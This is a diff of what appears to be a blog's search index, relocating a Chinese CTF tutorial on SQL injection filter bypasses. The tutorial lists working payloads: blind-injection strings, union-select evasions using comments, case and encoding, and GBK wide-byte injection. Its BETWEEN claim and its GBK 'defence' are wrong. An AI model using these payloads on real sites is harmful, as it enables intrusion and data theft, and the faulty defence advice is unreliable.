@@ -1767,95 +1767,6 @@ select 列名 from 库名.表名</p>
       </categories>
   </entry>
   <entry>
-    <title>sql注入常见注释及绕过</title>
-    <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
-<a id="more"></a>
-<h3 id="一、绕过空格（注释符-，-a0）"><a class="header-anchor" href="#一、绕过空格（注释符-，-a0）">¶</a>一、绕过空格（注释符/* */，%a0）</h3>
-<p>1.两个空格代替一个空格（双写）</p>
-<p>2.<code>%a0</code>=空格</p>
-<p>3.最基本的绕过方法，用注释替换空格：<code>/*注释/*</code></p>
-<p>4.括号绕过空格</p>
-<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
-<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
-<p>例如：time based盲注：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
-<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
-<h3 id="二、引号绕过（使用十六进制）"><a class="header-anchor" href="#二、引号绕过（使用十六进制）">¶</a>二、引号绕过（使用十六进制）</h3>
-<p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
-<p><strong>几乎没有任何注入能过滤十六进制。</strong></p>
-<h3 id="三、逗号绕过（使用from或者offset）"><a class="header-anchor" href="#三、逗号绕过（使用from或者offset）">¶</a>三、逗号绕过（使用from或者offset）</h3>
-<p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。</p>
-<p>例如：</p>
-<p>使用from to：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-<p>使用join：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
-<p>使用like：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span> #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>使用offset来绕过limit中的&quot;，&quot;：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
-<h3 id="四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）"><a class="header-anchor" href="#四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）">¶</a>四、比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3>
-<p>盲注的时候如果无法使用比较操作符，可使用<code>greatest()</code>、<code>least()</code>。（前者返回最大值，后者返回最小值）</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
-<p>使用between and：</p>
-<p>between a and b：返回a，b之间的数据，不包含b。</p>
-<h3 id="五、or-and-xor-not绕过"><a class="header-anchor" href="#五、or-and-xor-not绕过">¶</a>五、or and xor not绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and&#x3D;&amp;&amp; ， or&#x3D;|| ， xor&#x3D;| ， not&#x3D;!</span><br></pre></td></tr></table></figure>
-<h3 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a class="header-anchor" href="#六、绕过注释符号（-，–-后面跟一个空格））过滤">¶</a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>最后的or '1闭合查询语句的最后的单引号，或者：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
-<h3 id="七、-绕过"><a class="header-anchor" href="#七、-绕过">¶</a>七、= 绕过</h3>
-<p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
-<h3 id="八、绕过union，select，where等"><a class="header-anchor" href="#八、绕过union，select，where等">¶</a>八、绕过union，select，where等</h3>
-<p>1.使用注释符绕过：</p>
-<p>常用注释符：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ; , %00 , --a</span><br></pre></td></tr></table></figure>
-<p>用法：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
-<p>2.使用大小写绕过：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
-<p>3.内联注释绕过：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>双关键字绕过（若删除掉第一个匹配的union就能绕过）：</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3--</span></span><br></pre></td></tr></table></figure>
-<p>5.使用URLencode，ascii编码，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span>(ascii)</span><br></pre></td></tr></table></figure>
-<p>6.函数或特殊符号</p>
-<p>例如：表示admin，oracle中可以用 <code>'adm'||'in'</code> ,  mysql中可以用 <code>concat('adm','in')</code>; mssql中可以用：<code>'adm'+'in'</code></p>
-<h3 id="九、通用绕过（编码）"><a class="header-anchor" href="#九、通用绕过（编码）">¶</a>九、通用绕过（编码）</h3>
-<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
-<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
-<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
-<h3 id="十、等价函数绕过（不同数据库）"><a class="header-anchor" href="#十、等价函数绕过（不同数据库）">¶</a>十、等价函数绕过（不同数据库）</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br></pre></td></tr></table></figure>
-<p>例如：substring()和substr()无法使用时：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span></span><br></pre></td></tr></table></figure>
-<p>或者：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
-<h3 id="十一-宽字节注入"><a class="header-anchor" href="#十一-宽字节注入">¶</a>十一.宽字节注入</h3>
-<p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
-<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
-<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
-<p>id=-1%df%27union select 1,user(),3–+</p>
-<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
-<p>一般产生宽字节注入的PHP函数：</p>
-<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \  转为 \，将 &quot; 转为 &quot; 。用思路一。</p>
-<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , &quot; , \ 。用思路一</p>
-<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
-<p>3.mysql_real_escape_string()：转义下列字符：</p>
-<p>\x00 \n \r \ ’ &quot; \x1a</p>
-<p>（防御，将mysql设置为gbk即可）</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
     <title>sql注入之mysql学习基础(二)</title>
     <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
     <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
@@ -1955,6 +1866,95 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
 <a href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>
 看图<br>
 <a href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sql注入常见注释及绕过</title>
+    <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
+<a id="more"></a>
+<h3 id="一、绕过空格（注释符-，-a0）"><a class="header-anchor" href="#一、绕过空格（注释符-，-a0）">¶</a>一、绕过空格（注释符/* */，%a0）</h3>
+<p>1.两个空格代替一个空格（双写）</p>
+<p>2.<code>%a0</code>=空格</p>
+<p>3.最基本的绕过方法，用注释替换空格：<code>/*注释/*</code></p>
+<p>4.括号绕过空格</p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：time based盲注：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
+<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
+<h3 id="二、引号绕过（使用十六进制）"><a class="header-anchor" href="#二、引号绕过（使用十六进制）">¶</a>二、引号绕过（使用十六进制）</h3>
+<p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
+<p><strong>几乎没有任何注入能过滤十六进制。</strong></p>
+<h3 id="三、逗号绕过（使用from或者offset）"><a class="header-anchor" href="#三、逗号绕过（使用from或者offset）">¶</a>三、逗号绕过（使用from或者offset）</h3>
+<p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。</p>
+<p>例如：</p>
+<p>使用from to：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>使用join：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
+<p>使用like：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span> #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>使用offset来绕过limit中的&quot;，&quot;：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h3 id="四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）"><a class="header-anchor" href="#四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）">¶</a>四、比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3>
+<p>盲注的时候如果无法使用比较操作符，可使用<code>greatest()</code>、<code>least()</code>。（前者返回最大值，后者返回最小值）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
+<p>使用between and：</p>
+<p>between a and b：返回a，b之间的数据，不包含b。</p>
+<h3 id="五、or-and-xor-not绕过"><a class="header-anchor" href="#五、or-and-xor-not绕过">¶</a>五、or and xor not绕过</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and&#x3D;&amp;&amp; ， or&#x3D;|| ， xor&#x3D;| ， not&#x3D;!</span><br></pre></td></tr></table></figure>
+<h3 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a class="header-anchor" href="#六、绕过注释符号（-，–-后面跟一个空格））过滤">¶</a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>最后的or '1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
+<h3 id="七、-绕过"><a class="header-anchor" href="#七、-绕过">¶</a>七、= 绕过</h3>
+<p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
+<h3 id="八、绕过union，select，where等"><a class="header-anchor" href="#八、绕过union，select，where等">¶</a>八、绕过union，select，where等</h3>
+<p>1.使用注释符绕过：</p>
+<p>常用注释符：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ; , %00 , --a</span><br></pre></td></tr></table></figure>
+<p>用法：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+<p>2.使用大小写绕过：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
+<p>3.内联注释绕过：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>双关键字绕过（若删除掉第一个匹配的union就能绕过）：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3--</span></span><br></pre></td></tr></table></figure>
+<p>5.使用URLencode，ascii编码，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span>(ascii)</span><br></pre></td></tr></table></figure>
+<p>6.函数或特殊符号</p>
+<p>例如：表示admin，oracle中可以用 <code>'adm'||'in'</code> ,  mysql中可以用 <code>concat('adm','in')</code>; mssql中可以用：<code>'adm'+'in'</code></p>
+<h3 id="九、通用绕过（编码）"><a class="header-anchor" href="#九、通用绕过（编码）">¶</a>九、通用绕过（编码）</h3>
+<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
+<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="十、等价函数绕过（不同数据库）"><a class="header-anchor" href="#十、等价函数绕过（不同数据库）">¶</a>十、等价函数绕过（不同数据库）</h3>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br></pre></td></tr></table></figure>
+<p>例如：substring()和substr()无法使用时：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span></span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
+<h3 id="十一-宽字节注入"><a class="header-anchor" href="#十一-宽字节注入">¶</a>十一.宽字节注入</h3>
+<p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<p>id=-1%df%27union select 1,user(),3–+</p>
+<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数：</p>
+<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \  转为 \，将 &quot; 转为 &quot; 。用思路一。</p>
+<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , &quot; , \ 。用思路一</p>
+<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
+<p>3.mysql_real_escape_string()：转义下列字符：</p>
+<p>\x00 \n \r \ ’ &quot; \x1a</p>
+<p>（防御，将mysql设置为gbk即可）</p>
 ]]></content>
       <categories>
         <category>web技术学习</category>
